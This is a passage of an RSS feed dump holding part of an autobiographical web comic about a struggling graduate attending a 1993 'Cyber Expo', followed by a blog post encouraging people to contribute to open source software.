				Nearly any job I trained for now would be obsolete by 1990. Computers and solar-powered robot factories would be doing most of the work. Consumer goods would be mostly free, and the U.N. would be paying us all not to work. 
	</p></div>
</div>

</li>
<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/party1999_green.gif"></p><p>
			The important things in human life ‚Äî sex, technology, hedonism, and the peaceful exploration of inner and outer space ‚Äî these would occupy most of our time as a new Golden Age dawned for humanity. No matter where you went, you would find millions of groovy freaks boogying down, partying hearty, and tossing off symphonies, rocketship designs, and cures for cancer as freely as a tree drops fruit. Human civilization would have truly begun....
		</p>
	</div>
	
</li>
<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/vansex_color.gif" width="454" height="350"></p><p>
			And of course, I would be getting <i>righteously laid </i>every night of my life....
		</p>
	</div>
	
</li>
<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/09_cantwait.gif" width="251" height="349"> 
	</p>
	
</li>
<li>
	<div>
		<p><span size="6" color="#669999">July 4, 1994
			<br>
				Santa Luna, California</span></p><p>
		
			<img src="http://www.electricsheepcomix.com/almostguy/images/10balloon.gif" width="215" height="161"></p></div>

</li>
<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/20a_bills.gif" width="162" height="300"> <img src="http://www.electricsheepcomix.com/almostguy/images/20b_sock.gif" width="145" height="300"> 
		</p>
		
		
		
		
		
</li>
<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/20c_crackers.gif" width="169" height="300"> <img src="http://www.electricsheepcomix.com/almostguy/images/20d_diploma.gif" width="171" height="300"> 
	</p>
	
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/20e.gif" width="328" height="350"></p><div><p>
			Sure, I<i> could've</i> opened the door, but what good would that have done? 
			</p><p>
			
				What could I tell them, except that I didn't have the rent? 
			</p><p>
			
				And what could they say to me, except to remind me of what a <b>loser</b> I am? 
		</p><p>
		
			I already <i>know</i> I'm a loser. The fact is well established and needs no further elaboration. 
		</p></div>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/20f.gif" width="240" height="350"> <img src="http://www.electricsheepcomix.com/almostguy/images/20g.gif" width="184" height="350">
		
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/11_openwindow.gif" width="215" height="346">		
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/12.gif" width="243" height="325">
	<img src="http://www.electricsheepcomix.com/almostguy/images/12b.gif" width="243" height="325">
</p>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/running.gif" width="341" height="300"></p><div><p>
			Someday I'm going to break my leg doing that... Which would be bad, since I have no health insurance...
			</p><p>
I do, however, have a job. It just doesn't <b>pay</b> enough.
</p><p>
I'm not going anywhere in particular. I just have to lose myself in the suburbs for a few hours. I'll creep back later in the day. Hopefully my housemates will be gone and I can sneak back into my room.


		</p></div>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/peterwander_aframe.gif"></p><div><p>
			Then again, maybe today will be the day I come back and find all my belongings set out by the <b>dumpster</b>.
			
			</p><p>
That day <i>will</i> come. It's inevitable. My housemates' patience has surely reached its limit.

		</p></div>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/housemates.gif"></p><div><p>
			When school ended last month, I had to live <i>somewhere</i>. Of course, with a terrible credit rating like mine,
			(that trail of busted credit cards littering my passage through an "academic career") and no money for a deposit, 
			it wouldn't be easy to find a place. 
			</p><p>
			My current housemates, fortunately, didn't check my credit or ask for anything upfront... they naively assumed that since I was in college, I must be a solvent young bourgeois like themselves.
</p><p>
I did nothing to disabuse them of this illusion.

		</p></div>
</div>
<!--The background color for the page.-->


</li>




<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/peter_wander_sm.gif"></p><div><p>	
		I'm neither ashamed nor proud of myself.</p><p>
Like a rodent, I've simply done what I've needed to do to stay alive, <b>moment to moment.</b></p><p>
I feel miscast in this role, but here I am.
		</p></div>
	</div>
<!--The background color for the page.-->

</li>

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/peterwander4.png"></p><div><p>	
		
		The locale I'm trapped in is<b> Santa Luna,</b> California, a sleepy seaside college town 

 situated 50 miles west of Silicon Valley. If exciting things are happening in Silicon Valley, 
you surely won't hear about them here. 

Santa Luna is its own self-contained bubble reality, a sort of hippy-dippy alternate universe that might have branched off from ours
if McGovern had won the 1972 presidential election. 
</p><p>
Tourists call this town "charming." For me, being stuck here after I've  graduated
feels a lot like bathing in my own urine. 
		
		</p></div>
	</div>
<!--The background color for the page.-->

</li>


<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/peterlookingdown.gif"></p><p>					
			Lately I've been coming here a lot, to the <b>edge of the suburbs.</b></p>
</div>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/homeless_vista.gif"></p><p>			
			Out on the edge of town, where the freeway meets the warehouse district, Santa Luna's homeless people live.

			

		</p>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/23d.gif"></p><p>			
			<b>Excluded</b> from the industrial lifestyle of modern humanity ‚Äî and yet denied even the simple dignity of <b>animals</b> ‚Äî theirs, I was certain, must be the <b>worst</b> of all possible worlds.

			

		</p>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/23e.gif">

</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/24a.gif">
	
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/24b.gif">
	
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/24d.gif">
	
</p>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/24e.gif">
	
</p>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/24f.gif"> 	<img src="http://www.electricsheepcomix.com/almostguy/images/24g.gif">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/24h.gif">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/25.gif">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/27.gif">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/cybercard.gif">
	
</p>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~ CHAPTER TWO  ~~~~~~~~~~~~~-->

<li>
	<div>
	<p>
	
	
	<h2>An Atomic Car <br>in Every Garage</h2>
	</p>
</div>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_gibson.gif"></p><div><p>

For those of you who either weren't alive, or weren't paying attention at the time:
</p><p>
Back in 1983 an old acidhead named William Gibson sat down at his
Hermes 3000 manual typewriter and banged out what was to become
the most popular science fiction novel of that decade...
</p><p>
Concerning people plugging their brains directly into their
computers, Gibson's novel was originally titled <i>Jacked In.</i></p><p>
The publishers feared this sounded too much like "jacked off",
and changed the title to a more marketable <i>Neuromancer</i>.

	</p></div>
	
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_neuromancer.gif"></p><div><p>


This little book of his was to cause quite a stir...</p><p>

<i>Neuromancer</i> had a tremendous cultural impact, not the least of which was the introduction of a new word into the English language 
‚Äî <i><b>cyberspace</b></i>.
</p><p>
In subsequent years, the prefix "cyber-" sort of broke off and did its own <i>thing...</i></p></div>
</div>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_cyberexpo93.gif"></p><div><p>
Which brings us to the year 1993 and the first annual <b>‚ÄúCyber Expo.‚Äù</b></p><p>

For the past few years I had been reading about a newly emerging <b> ‚Äúcyberculture‚Äù </b>
in exciting new magazines with names like <i>Phringe Surfer, FutureShock, Cyborgasm, Digital Frontier</i>, and <i>Fast Forward.</i></p><p>
In May of 1993 I scraped together my month's grocery money and made the Greyhound bus trip to San Francisco. 
I was <i>finally</i> going to meet the movers and shakers of this cyberculture face to face!
Smart drug entrepreneurs, multimedia artists, hackers, inventors of mindblowing new technologies,
<i>all</i> would be congregating here in this one space. 

</p></div>
	
</div>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/cyberexpo2.gif"></p><div><p>
It was already 1993, and the future  I'd imagined in 1978 was running a little behind schedule.</p><p>

Was it possible that here and now, the future was off to a proper start?</p><p>

Would I  finally  find the community I'd always hoped for? </p><p> Would I, at last,  discover  ‚Äúmy‚Äù people?

</p></div>
	
</div>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30b_cyberevolution.gif">
	
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->


<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/31.gif"></p><div><p>
The presentation was called ‚ÄúCyber Revolution: Power to the People‚Äù and it was attended by some of the hippest of the California "Digerati".
</p><p>
I took the opportunity to buttonhole an editor I'd been petitioning for several months. His name was Sparky West and he was editor-in-chief of 
<i>Fast Forward</i>, one of the seminal cyberculture magazines.
</p><p>
Their motto: <i>"Made for the Smartest People on Earth."</i></p><p>
(Yes,<i> I know.</i> That should have been my first warning.)
</p></div>
	
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/32.gif">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/32b.gif">
	
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/33_pavillion.gif">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/45.png">
	
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/35.gif"><br>
	* Complete bullshit, of course.
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/48.png">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/49.png">
	
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/37b.gif">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/38.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/37.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/40.gif">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/40b.gif">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/41.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/56.png">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/43.gif">
</p>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/no_email.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/45.gif">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/46_nocomputer.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/47.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/48.gif">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/49a.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/49b.gif"> <img src="http://www.electricsheepcomix.com/almostguy/images/49c.gif">
</p> 
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/49d.gif">
</p>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50.gif"></p><div>
		<p>
That night I did something I'd never done before in my life.</p><p>
I got <b>drunk</b>.
</p></div>
</div>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50_sprawled.gif"></p><div><p>
		I went to a seedy bar across the street from the convention center and drank my first beer... quickly followed by my second, my third and 
		my <b>fourth</b>.

</p><p>
When I came back later that evening, Cyber Expo '93 had transformed into an enormous "rave" party.
</p><p>
808 and Guinness proved to be a bad mix; but then, I wasn't really in a partying mood to begin with.
</p></div>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50a_puke.gif"></p><div><p>
		
It was a crowded bathroom, as bathrooms usually are at these events... 
Stoned ravers stampeding in to empty their bladders of all the $7-a-bottle mountain-spring water 
and ‚Äúsmart-drinks‚Äù they've been guzzling on the dancefloor. 


</p><p>

I knew I was taking more than my fair timeshare in this stall, so I wasn't too surprised when this random guy came barging in..... obviously needing the toilet for the same reasons I did...
</p><p>

<i>(Readers of delicate sensibility may wish to abandon the narrative at this point...)</i></p></div>
</div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50c.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50c_sushi.gif">
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50_beer.gif">
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/50f.gif"><br>
	*You were warned.
</p>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/51a.gif"><br>

</p>
<!--The background color for the page.-->
</li>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
	
<p>
		
I kept imagining I'd strike up a conversation <br>
with some cool people and get myself  <br>invited
to a <i>cyber-party</i>.....
</p><p><img src="http://www.electricsheepcomix.com/almostguy/images/30_invite.gif">
</p></div>
<!--The background color for the page.-->
</li>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
	
<p>
		
Once there, I'd meet the woman of my dreams...<br>
Some futuristic cyber-babe, who'd blow my mind and<br>
leave my soul aching for new adventures....
</p><p><img src="http://www.electricsheepcomix.com/almostguy/images/30_digeratiparty.gif">
</p></div>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
	
<p>
Later, we'd drop acid and have 12 hours of Tantric sex, <br>
after which she'd tutor me in Video Toaster and give me a job<br>
as creative director of her startup <i>smart drink company...</i>
</p><p><img src="http://www.electricsheepcomix.com/almostguy/images/30_cybersex.gif">
</p></div>
<!--The background color for the page.-->
</li>



<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/52_luden_puker.gif"> <img src="http://www.electricsheepcomix.com/almostguy/images/52_recog.gif">
	
	
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_1988.gif"> 
</p>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div><p>
I can't tell you how much that magazine of yours inspired me.<br>
I suffered through every suck job in college just dreaming of<br>
the day I'd  finally get to jack into<i> cyberspace.</i>
</p>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_dishwashing.gif"> 
</p></div>
<!--The background color for the page.-->
</li>


<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

<li>
	<div>
<p><img src="http://www.electricsheepcomix.com/almostguy/images/30_yummies.gif"></p><div><p>
From the moment I read about the existence of the Cyberculture, 
I wanted to be a <i>part</i> of it.
</p><p>
The people you described in your magazine  ‚Äî
all those hackers, freaks and revolutionaries  ‚Äî
Each of them was exactly the kind of person I ‚Ä¶</p></div></div></li></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.electricsheepcomix.com/almostguy/">http://www.electricsheepcomix.com/almostguy/</a></em></p>]]>
            </description>
            <link>http://www.electricsheepcomix.com/almostguy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549042</guid>
            <pubDate>Sun, 27 Dec 2020 05:14:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Start Contributing to Open Source Software]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25547724">thread link</a>) | @fagnerbrack
<br/>
December 26, 2020 | https://markushatvan.com/blog/why-you-should-start-contributing-to-open-source-software-right-now | <a href="https://web.archive.org/web/*/https://markushatvan.com/blog/why-you-should-start-contributing-to-open-source-software-right-now">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure> <figcaption>I know you want to. - Photo by Author </figcaption></figure> <p>You might not be aware of it, but you use some form of open source software every single day.</p> <p>Every time you start an app on your phone or launch a program on your computer, you profit from the code that someone has written for free.</p> <p>WordPress, the largest and most well-known content management system, is used by <a href="https://w3techs.com/technologies/details/cm-wordpress" rel="nofollow">38% of all websites</a> worldwide. It is open source and free to use.</p> <p>Linux is powering <a href="https://w3techs.com/technologies/details/os-linux" rel="nofollow">30% of all websites</a> globally. It is open source and free to use.</p> <p>These are just two examples out of a myriad of projects which were created to solve a problem or serve a use case.</p> <p>These projects became highly popular as communities formed around them. They tried to deliver the best product possible in terms of user experience, stability, security, and more.</p> <p>But not only the usage of open source projects is rising. The participation in the open source movement as a whole is growing as well.</p> <p>According to the <a href="https://octoverse.github.com/" rel="nofollow">State of the Octoverse report</a> by GitHub, out of more than 40 million developers on GitHub, 10 million new&nbsp;users joined in 2019 alone!</p> <p>The open source movement is growing quickly and you should become a part of it too.</p> <p>Whenever I see a new update for my operating system or new software releases of tools that I actively use every day, it makes me smile. I enjoy the thought of products continuously getting better and more sophisticated.</p> <p>Do you feel the same way?</p> <p>Here is why I am convinced that you should start contributing to open source software right now.</p> <h2>You can learn a lot from the source code</h2> <p>Since the source code in open source projects is available for anyone to read, that means that a large number of developers can battle-test and improve a project.</p> <p>Developers point out privacy or security issues, update the documentation, and improve source code to the newest web development standards all the time.</p> <p>Especially when you go through the code of projects with hundreds or even thousands of contributors, you can gain immense knowledge about best practices and code quality.</p> <p>Not only is reviewing the code itself a learning experience, but also the structure and folder hierarchy in larger projects is well thought-out and works well in the long run.</p> <h2>You will work with the smartest people</h2> <p>Compared to a company that has a limited number of employees to work on feature requests and bug fixes, you have the brightest minds working in open source development.</p> <p>In my imagination, I see it as swarm intelligence, which can solve every problem that arises.</p> <p>The more people that join a community, the better a project can scale. It can be like a buzzing beehive, where you could have pull requests to a codebase from users all around the world 24/7, non-stop.</p> <p>A good example is the well-known code editor <a href="https://github.com/microsoft/vscode" rel="nofollow">Visual Studio Code</a> which got very popular with a total of 1,200+ contributors on GitHub.</p> <p>You won‚Äôt see a single day without any pull requests on GitHub and the monthly release cycles always bring out new amazing features.</p> <p>When you participate in a project and submit a pull request, you will receive extremely helpful feedback from highly experienced maintainers. You can then implement that feedback to grow as a developer.</p> <h2>Your own code could be used globally</h2> <p>Since some software development projects are used by millions of users daily, it can be very rewarding to see your own code helping so many people.</p> <p>I wrote lint rules for the JavaScript projects called <a href="https://github.com/sindresorhus/eslint-plugin-unicorn" rel="nofollow">eslint-plugin-unicorn</a> and <a href="https://github.com/sveltejs/svelte" rel="nofollow">svelte</a>. It‚Äôs a great feeling knowing that my pull request will improve the code quality of many developers all around the world.</p> <p>From my personal experience, it is also motivating to get positive feedback in the form of a thankful comment.</p> <h2>Open source projects are inclusive</h2> <p>A great advantage of free open source software is that no one is excluded from using the product because they can‚Äôt afford it.</p> <p>While some open source projects cost money to use, most do not.</p> <p>Also, when you‚Äôre contributing to a project on GitHub, many of the bigger repositories have a code of conduct. These make sure that every contributor feels welcome and accepted in a project.</p> <h2>Projects are starting to become sustainable</h2> <p>The main goal of a company is to become profitable - which often leads to questionable decisions. But open source software focuses on solving the needs of its users as the highest priority.</p> <p>Most projects are entirely volunteer-supported, and project maintainers will unfortunately never see any financial reward. But there are great ways nowadays that you can help make these projects sustainable.</p> <p>With websites like <a href="https://opencollective.com/" rel="nofollow">OpenCollective</a>&nbsp;or <a href="https://github.com/sponsors" rel="nofollow">GitHub Sponsors</a>, you can donate to speed up the development of projects that you like.</p> <p>Personally, I think that it would be great if every company donated at least a small sum to open source software projects because they profit from these tools daily. Such support would reduce the stress for a lot of maintainers and some could even take up the work full-time.</p> <h2>How to contribute to open source</h2> <p>Contributing to open source development sounds more scary than it really is. There are plenty of projects out there on GitHub which encourage first time contributors and newbies to take action by labeling issues as ‚ÄúGood first issue‚Äù, ‚ÄúBeginner friendly‚Äù or ‚ÄúHelp wanted‚Äù.</p> <p>Don‚Äôt know where to start?</p> <p>Ask yourself: what is an application that you enjoy using every day and where you would want to give back?</p> <p>It can be as simple as searching for that application on GitHub and looking through the open issues.</p> <p>It doesn‚Äôt have to be a code contribution, either - you can also help out by creating a pull request to update the documentation, fix typos that you find, or by doing a thorough code review.</p> <p>The <code>README.md</code> file of a project usually includes a passage of how to contribute.</p> <p>If you decide to contribute to a project, I recommend reading my article about&nbsp;<a href="https://markushatvan.com/blog/contributing-to-open-source-projects-the-right-way">Contributing To Open Source Projects The Right Way</a>. It‚Äôs a detailed step-by-step guide about the contribution workflow.</p> <p>I wrote it to be very beginner friendly, so don‚Äôt worry about becoming overwhelmed. You will be able to find your first project and submit a contribution in no time!</p> <h2>Wrapping up</h2> <p>It always impressed me that everyone in the world can join an open source software project and work on it.</p> <p>And open source software only works as a collaborative effort. The goal is to produce the best product or service without compromising on important factors like stability, security, or user privacy.</p> <p>I hope you understand the importance of open source software and that you value its benefits. No matter what your reasons are for giving back to the open source community, just know that you are highly appreciated!</p> <p>Many projects can only thrive with support and contributions from developers like you.</p> <h2>Helpful resources</h2> <ul><li><a href="https://octoverse.github.com/" rel="nofollow">The State of the Octoverse</a></li> <li><a href="https://opensource.com/resources/what-open-source" rel="nofollow">What is open source?</a></li> <li><a href="https://clearcode.cc/blog/why-developers-contribute-open-source-software/" rel="nofollow">What Motivates a Developer to Contribute to Open-Source Software?</a></li></ul> <div><p><b>If you liked this post, share it:</b></p> <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmarkushatvan.com%2Fblog%2Fwhy-you-should-start-contributing-to-open-source-software-right-now" rel="noopener noreferrer" target="_blank" title="Share on Facebook"><svg height="24" role="presentation" style="font-size:1.5em" version="1.1" viewBox="0 0 512 512" width="24"> <path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z" key="path-0"></path> </svg></a> <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fmarkushatvan.com%2Fblog%2Fwhy-you-should-start-contributing-to-open-source-software-right-now&amp;title=Why%20You%20Should%20Start%20Contributing%20to%20Open%20Source%20Software%20Right%20Now&amp;summary=The%20open%20source%20movement%20is%20growing%20quickly%20and%20you%20should%20become%20a%20part%20of%20it%20too.&amp;source=LinkedIn" rel="noopener noreferrer" target="_blank" title="Share on LinkedIn"><svg height="24" role="presentation" style="font-size:1.5em" version="1.1" viewBox="0 0 448 512" width="21"> <path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z" 